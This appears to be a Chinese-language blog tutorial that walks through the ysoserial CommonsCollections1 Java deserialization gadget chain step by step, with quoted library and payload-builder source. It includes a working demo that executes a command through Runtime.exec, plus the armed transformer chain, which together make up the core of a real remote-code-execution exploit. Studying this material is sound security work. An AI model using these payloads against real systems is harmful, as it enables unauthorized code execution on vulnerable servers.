# 前言

 **ysoserial** 是知名的`Java反序列化`利用工具，对其中的 **gadget** 进行学习能够更清晰地理解 **反序列化** 。

本篇文章将对**`gadget Commons-Collections1` **的** Gadget chain**自下而上，由浅入深进行剖析。

## 正文

在分析`反序列化`之前，我们首先需要明确`调用链`。而 **Commons-Collections1** 在开头也给出了`调用链`

    
    
    Gadget chain:
    		ObjectInputStream.readObject()
    			AnnotationInvocationHandler.readObject()
    				Map(Proxy).entrySet()
    					AnnotationInvocationHandler.invoke()
    						LazyMap.get()
    							ChainedTransformer.transform()
    								ConstantTransformer.transform()
    								InvokerTransformer.transform()
    									Method.invoke()
    										Class.getMethod()
    								InvokerTransformer.transform()
    									Method.invoke()
    										Runtime.getRuntime()
    								InvokerTransformer.transform()
    									Method.invoke()
    										Runtime.exec()
    
    	Requires:
    		commons-collections
    

而这个`调用链`中的核心链条则是由 **ChainedTransformer** 、 **ConstantTransformer** 、
**InvokerTransformer** 构成，因此 **Commons-Collections1** 的分析无论如何也避不开它们。

这3个类都实现了 **Transformer** 接口， **Transformer** 接口中只有1个`transform()`方法。

前面说到核心链条是由实现了 **Transformer** 接口的3个类构成的，而核心链条的运转核心则是 **Transformer**
接口的`transform()`方法。

    
    
    public interface Transformer {
    
        /**
         * Transforms the input object (leaving it unchanged) into some output object.
         *
         * @param input  the object to be transformed, should be left unchanged
         * @return a transformed object
         * @throws ClassCastException (runtime) if the input is the wrong class
         * @throws IllegalArgumentException (runtime) if the input is invalid
         * @throws FunctorException (runtime) if the transform cannot be completed
         */
        public Object transform(Object input);
    
    }
    

### ChainedTransformer.transform()链的诞生

#### ConstantTransformer

该 **Transformer** 是 **Transformer** 如其名，根据源码的注释说明 **ConstantTransformer** 每次都会
**return** 一个同样的`constant`。重点在其构造器`ConstantTransformer(Object
constantToReturn)`和`transform()`

    
    
    /**
     * Transformer implementation that returns the same constant each time.
     */
    public class ConstantTransformer implements Transformer, Serializable {
    
        /** The closures to call in turn */
        private final Object iConstant;
    
        public ConstantTransformer(Object constantToReturn) {
            super();
            iConstant = constantToReturn;
        }
    
        /**
         * Transforms the input by ignoring it and returning the stored constant instead.
         * 
         * @param input  the input object which is ignored
         * @return the stored constant
         */
        public Object transform(Object input) {
            return iConstant;
        }
    
    }
    

`transform()`方法会返回 **ConstantTransformer** 初始化时存储的常量 **constantToReturn**

#### InvokerTransformer

首先见名知意这是一个 **调用Transform** ，同样我们的关注点是`transform()`方法

    
    
    /**
     * Transformer implementation that creates a new object instance by reflection.
     */
    public class InvokerTransformer implements Transformer, Serializable {
    
        public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            super();
            iMethodName = methodName;
            iParamTypes = paramTypes;
            iArgs = args;
        }
    
        /**
         * Transforms the input to result by invoking a method on the input.
         * 
         * @param input  the input object to transform
         * @return the transformed result, null if null input
         */
        public Object transform(Object input) {
            if (input == null) {
                return null;
            }
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(iMethodName, iParamTypes);
                return method.invoke(input, iArgs);
            }
        }
    }
    

简单来说 **InvokerTransformer** 的`transform()`方法根据 **iMethodName** ，
**iParamTypes** 底层调用`method.invoke(Object obj, Object... args)`方法并返回其结果。

#### ChainedTransformer

    
    
    /**
     * Transformer implementation that chains the specified transformers together.
     */
    public class ChainedTransformer implements Transformer, Serializable {
    
        public ChainedTransformer(Transformer[] transformers) {
            super();
            iTransformers = transformers;
        }
    
        /**
         * Transforms the input to result via each decorated transformer
         * 
         * @param object  the input object passed to the first transformer
         * @return the transformed result
         */
        public Object transform(Object object) {
            for (int i = 0; i < iTransformers.length; i++) {
                object = iTransformers[i].transform(object);
            }
            return object;
        }
    }
    

可以看到 **ChainedTransformer** 的`transform()`方法非常有链条的感觉对吧。

由此可以写出核心链条了

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    
    public class TransformDemo01 {
        public static void main(String[] args) {
            //执行的command
            String command="calc.exe";
            final String[] execArgs = new String[] { command };
    
            //准备齿轮
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class }, execArgs)
            };
    
            Transformer transformer=new ChainedTransformer(transformers);//塞进链条
            transformer.transform(new Object());//链条转动
        }
    }
    

对应在 **Commons-Collections1** 的源码

    
    
    final String[] execArgs = new String[] { command };
    		// inert chain for setup
    		final Transformer transformerChain = new ChainedTransformer(
    			new Transformer[]{ new ConstantTransformer(1) });
    		// real chain for after setup
    		final Transformer[] transformers = new Transformer[] {
    				new ConstantTransformer(Runtime.class),
    				new InvokerTransformer("getMethod", new Class[] {
    					String.class, Class[].class }, new Object[] {
    					"getRuntime", new Class[0] }),
    				new InvokerTransformer("invoke", new Class[] {
    					Object.class, Object[].class }, new Object[] {
    					null, new Object[0] }),
    				new InvokerTransformer("exec",
    					new Class[] { String.class }, execArgs),
    				new ConstantTransformer(1) };
    

### LazyMap.get()链的诞生

可以看到这个 **demo** 的最后是我们手动启动了链条`transformer.transform(new Object())`。

下一步就是往上找一级齿轮自动的帮我们完成`transformer.transform(new Object())`。

 **Commons-Collections1** 给出了一份答案，选择的是 **LazyMap**

#### LazyMap

    
    
    /**
     * Decorates another <code>Map</code> to create objects in the map on demand.
     */
    public class LazyMap
            extends AbstractMapDecorator
            implements Map, Serializable {
    
        protected LazyMap(Map map, Transformer factory) {
            super(map);
            if (factory == null) {
                throw new IllegalArgumentException("Factory must not be null");
            }
            this.factory = factory;
        }
    
        public Object get(Object key) {
            // create value for key if key is not currently in the map
            if (map.containsKey(key) == false) {
                Object value = factory.transform(key);
                map.put(key, value);
                return value;
            }
            return map.get(key);
        }
    }
    

`get(Object key)`方法会执行 **factory** 的`transform(Object input)`方法，而根据构造器和
**CommonsCollections1** 的源码得知 **factory** 将是我们传入的 **ChainedTransformer** 。

    
    
    //CommonsCollections1.java
    public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
        public InvocationHandler getObject(final String command) throws Exception {
            final Map innerMap = new HashMap();
    		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        }
    }
    
    //LazyMap.java
    public class LazyMap
            extends AbstractMapDecorator
            implements Map, Serializable {
    
        protected LazyMap(Map map, Transformer factory) {
            super(map);
            if (factory == null) {
                throw new IllegalArgumentException("Factory must not be null");
            }
            this.factory = factory;
        }
    
        public static Map decorate(Map map, Factory factory) {
            return new LazyMap(map, factory);//调用的还是构造器方法
        }
    }
    

旧的问题解决了，新问题却随之而来。我们需要一个 **东西X** 来执行`LazyMap.get()`。

这个 **X** 便是 **AnnotationInvocationHandler**

#### AnnotationInvocationHandler.invoke()链的诞生

在`AnnotationInvocationHandler.invoke(Object proxy, Method method, Object[]
args)`方法中会执行`memberValues.get(member)`

    
    
    /**
     * InvocationHandler for dynamic proxy implementation of Annotation.
     */
    class AnnotationInvocationHandler implements InvocationHandler, Serializable {
        private final Map<String, Object> memberValues;
    
        //构造器
        AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
            Class<?>[] superInterfaces = type.getInterfaces();
            if (!type.isAnnotation() ||
                superInterfaces.length != 1 ||
                superInterfaces[0] != java.lang.annotation.Annotation.class)
                throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
            this.type = type;
            this.memberValues = memberValues;
        }
    
        //关键在这！！！
        public Object invoke(Object proxy, Method method, Object[] args) {
            String member = method.getName();
            int parameterCount = method.getParameterCount();
    
            // Handle Object and Annotation methods
            if (parameterCount == 1 && member == "equals" &&
                    method.getParameterTypes()[0] == Object.class) {
                return equalsImpl(proxy, args[0]);
            }
            if (parameterCount != 0) {
                throw new AssertionError("Too many parameters for an annotation method");
            }
    
            if (member == "toString") {
                return toStringImpl();
            } else if (member == "hashCode") {
                return hashCodeImpl();
            } else if (member == "annotationType") {
                return type;
            }
    
            // Handle annotation member accessors
            Object result = memberValues.get(member);//在这里调用了get()
    
            return result;
        }
    }
    

根据构造器可知我们需要把 **LazyMap** 作为初始化参数 **memberValues** 传入，因此我们需要将其装入
**AnnotationInvocationHandler** 中

    
    
    //CommonsCollections1.java
    //创建一个实现Map接口且类型为Map的代理对象mapProxy
    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
    
    //Gadgets.java
    public class Gadgets {
        public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
    
        public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
            return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);//调用的还是Proxy.newProxyInstance()
        }
    
        //获取InvocationHandler
        public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
            return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        }
    
        //创建动态代理对象
        public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
            final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
            allIfaces[ 0 ] = iface;
            if ( ifaces.length > 0 ) {
                System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
            }
            return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
        }
    }
    

但是同样地面临一个问题，那就是我们又需要某个 **东西X** 来调用`invoke(Object proxy, Method method,
Object[] args)`方法使得链条启动。

#### AnnotationInvocationHandler.readObject()链的诞生

这回的调用并不是那么的显式，如果缺乏动态代理的相关知识时。

在[动态代理](https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984)中，调用
**被代理对象** 的`任意方法A()`时，都将经过 **代理对象** 的`invoke(Object proxy, Method method,
Object[] args)`方法进行调用。

这也是为什么选择了一个 **InvocationHandler** 类的原因。

而 **AnnotationInvocationHandler**
的`readObject()`就有调用`Map.entrySet()`方法。调用链再次连接了起来，而且在反序列化时 **JVM**
会调用`readObject()`方法，这回终于到达了链条的尽头。

    
    
    private void readObject(java.io.ObjectInputStream s)
             throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();
    
        // Check to make sure that types have not evolved incompatibly
     
        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        }catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
             }
     
        Map<String, Class<?>> memberTypes = annotationType.memberTypes();
    
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                            	annotationType.members().get(name)));
                }
            }
        }
    }
    

把 **mapProxy** 通过 **AnnotationInvocationHandler** 再代理一下最后设置一下
**transformerChain.iTransformers** 为之前准备好的 **transformers** 即可

    
    
    public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
    
    	public InvocationHandler getObject(final String command) throws Exception {
    
            //略...
    
    		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
    
    		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
    
    		return handler;
    	}
    
    	public static void main(final String[] args) throws Exception {
            //System.out.println(isApplicableJavaVersion());
    		PayloadRunner.run(CommonsCollections1.class, args);
    	}
    
        //略...
    
    }
    

## 可能出现的坑

  1. 当运行时出现`java.lang.Override missing element entrySet`的报错，这是因为 **JDK版本** 过高。在 **CommonsCollections1** 中有个方法用于判断当前 **JDK版本** 是否合适。

    
    
    public static boolean isApplicableJavaVersion() {
            return JavaVersion.isAnnInvHUniversalMethodImpl();
        }
    /**
    * JDK版本小于8，如果是JDK8则更新数小于72
    */
    public static boolean isAnnInvHUniversalMethodImpl() {
            JavaVersion v = JavaVersion.getLocalVersion();
            return v != null && (v.major < 8 || (v.major == 8 && v.update <= 71));
        }
    

因为在这次更新后， **AnnotationInvocationHandler**
发生了一些[改变](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java)，`AnnotationInvocationHandler.readObject(java.io.ObjectInputStream
s)`中的 **memberValues** 不是准备好的 **LazyMap** ，而是一个获取不到 **entrySet** 的
**LinkedHashMap** 导致工具链遭到破坏。

  2. 在`readObject(java.io.ObjectInputStream s)`里不是调用了 **被代理对象** 的`entrySet()`方法吗？这个时候应该经由 **代理对象** 的`invoke(Object proxy, Method method, Object[] args)`方法调用了吧？为什么还要动态代理一次 **mapProxy** 呢？

    
    
    public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
    
    	public InvocationHandler getObject(final String command) throws Exception {
            //略...
    
            final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
    
    		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
        }
    }
    

有这个疑惑是因为还没有充分理解动态代理。

 **被代理对象A** 被 **代理对象B** 代理后，想调用 **被代理对象A** 的`a()`方法时，应该通过 **代理对象B**
调用`B.a()`，然后 **JVM** 引导到`B.invke(Object proxy, Method method, Object[]
args)`来调用 **被代理对象A** 的`a()`方法。

而不是 **代理对象B** 中的某个方法`B.b(){A.a()}`调用了 **被代理对象** 的`任意方法A()`时， **JVM**
引导至`B.invoke()`。

所以我们执行的实际上是`mapProxy.entrySet()`， **JVM** 才会引导至`mapProxy.invoke()`。

与此同时又知道在`AnnotationInvocationHandler.readObject(java.io.ObjectInputStream
s)`中会执行`memberValues.entrySet()`。而这个 **memberValues** 就需要是 **mapProxy**
了，所以需要对 **mapProxy** 再进行一次代理。

## 参考链接

> [动态代理 - 廖雪峰的官方网站
> (liaoxuefeng.com)](https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984)
>
> [jdk8u/jdk8u-dev/jdk:
> src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java
> diff](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java)

